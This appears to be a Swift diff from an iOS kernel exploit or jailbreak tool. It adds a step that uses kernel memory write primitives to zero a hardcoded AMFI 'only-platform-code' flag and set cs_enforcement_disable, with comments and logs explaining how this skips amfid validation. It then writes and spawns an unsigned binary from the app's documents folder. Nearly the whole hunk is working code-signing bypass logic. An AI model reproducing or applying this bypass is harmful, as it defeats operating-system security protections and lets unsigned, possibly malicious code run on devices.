@@ -62,6 +62,61 @@ final class ExpTCDirectInject {
         log("kernel slide: 0x\(String(format: "%llx", slide))")
         log("")
         
+        // ═══════════════════════════════════════════════════════════════
+        // CRITICAL GHIDRA FINDING (2026-05-31):
+        // DAT_fffffff007b79bd9 = "amfi-only-platform-code" flag
+        // When 1: kernel calls amfid for non-trust-cache binaries
+        // When 0: kernel SKIPS amfid entirely!
+        //
+        // Set during AMFI init from device tree property.
+        // If we can write it to 0, amfid is never consulted.
+        // Combined with cs_enforcement_disable=1, unsigned exec should work.
+        // ═══════════════════════════════════════════════════════════════
+        
+        log("[0/5] Trying AMFI platform-only flag bypass...")
+        let amfiPlatformOnlyAddr: UInt64 = 0xfffffff007b79bd9 &+ slide
+        let currentVal = ds_kread8(amfiPlatformOnlyAddr)
+        log("  amfi_only_platform_code @ 0x\(String(format: "%llx", amfiPlatformOnlyAddr)) = \(currentVal)")
+        
+        if currentVal != 0 {
+            ds_kwrite8(amfiPlatformOnlyAddr, 0)
+            let verify = ds_kread8(amfiPlatformOnlyAddr)
+            if verify == 0 {
+                log("  ✅ WRITTEN TO 0! Kernel will skip amfid callout!")
+                log("")
+                log("  This means: non-trust-cache binaries skip amfid validation")
+                log("  Combined with cs_enforcement_disable=1, unsigned exec should work")
+                log("")
+                
+                // Also ensure cs_enforcement_disable = 1
+                let csDisableAddr: UInt64 = 0xfffffff00a160798 &+ slide
+                ds_kwrite32(csDisableAddr, 1)
+                log("  cs_enforcement_disable = 1 ✅")
+                log("")
+                
+                // Skip trust cache injection — try direct spawn!
+                log("[SHORTCUT] Trying unsigned spawn directly (no TC needed)...")
+                let binary = buildMinimalBinary()
+                let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
+                let binPath = docs + "/tc_direct_test"
+                try? binary.write(to: URL(fileURLWithPath: binPath))
+                spawnTest(binPath: binPath)
+                return
+            } else {
+                log("  ❌ Write failed (value still \(verify)) — __DATA_CONST protected")
+                log("  Falling back to trust cache injection...")
+            }
+        } else {
+            log("  Already 0! (unexpected — trying spawn directly)")
+            let binary = buildMinimalBinary()
+            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
+            let binPath = docs + "/tc_direct_test"
+            try? binary.write(to: URL(fileURLWithPath: binPath))
+            spawnTest(binPath: binPath)
+            return
+        }
+        log("")
+        
         // Step 1: Find a writable trust cache module
         log("[1/5] Scanning for trust cache modules...")
         
